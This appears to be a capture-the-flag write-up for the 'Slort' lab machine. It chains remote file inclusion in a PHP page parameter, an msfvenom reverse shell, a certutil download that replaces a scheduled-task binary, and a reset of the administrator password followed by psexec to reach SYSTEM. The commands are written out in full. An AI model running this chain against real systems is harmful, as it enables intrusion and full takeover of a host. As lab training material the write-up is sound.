# PG Slort
## RFI, /backup,Scheduled Task, Binary Hijack, Psexec
## nmap
```
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           FileZilla ftpd 0.9.41 beta
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql?
4443/tcp  open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
8080/tcp  open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC

Both port 8080 and 4443 contain the same web directory redirecting both to the /dashboard/ directory for XAMPP.
```
## dirsearch
```
Running dirsearch.py against the target reveals the /site page.
python3 dirsearch.py -u http://192.168.230.53:8080 -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 60 --full-url ( big.txt, raft lists, dirb lists)

Looking at the full address of the index.php page we can see a potentially vulnerable parameter:
http://192.168.230.53:8080/site/index.php?page=main.php

Looking at the part index.php?page=<Value> we can test for RFI to see if vulnerable.
I created a test.txt file on my attacking machine and then hosted the directory with a Python SimpleHTTPServer. Then browsed to the following:
http://192.168.230.53:8080/site/index.php?page=http://192.168.49.230/test.txt
RFI is a go.
```
## RFI
```
We can generate a PHP reverse shell with msfvenom to catch a revshell using RFI.
msfvenom -p php/reverse_php LHOST=tun0 LPORT=21 -f raw > phpreverseshell.php , or use Ivan's php shell. 
We are connected running as the user rupert.
```
## Privesc /backup, Scheduled Task, Binary Hijack, psexec
```
Looking through the C:\ root directory we have a folder called backup.
Looking at the contents within and reading info.txt we see that the note mentions TFTP.EXE is executed every 5 minutes.

I was able to delete TFTP.EXE which means we can replace it with a malicious shell.
Knowing this we can generate a reverse shell with msfvenom and call it TFTP.EXE, upload it. 
certutil.exe -f -urlcache -split http://192.168.49.230/TFTP.EXE

A netcat listener was set up on port 21 and after 5 minutes the TFTP.EXE was executed as part of the scheduled task and we receive an administrator shell.

We are administrator and can escalate to SYSTEM by changing the administrator password:
net user administrator Password123

Then using Psexec.py to gain shell as SYSTEM.
sudo python2 psexec.py /administrator:Password123@192.168.230.53 
```







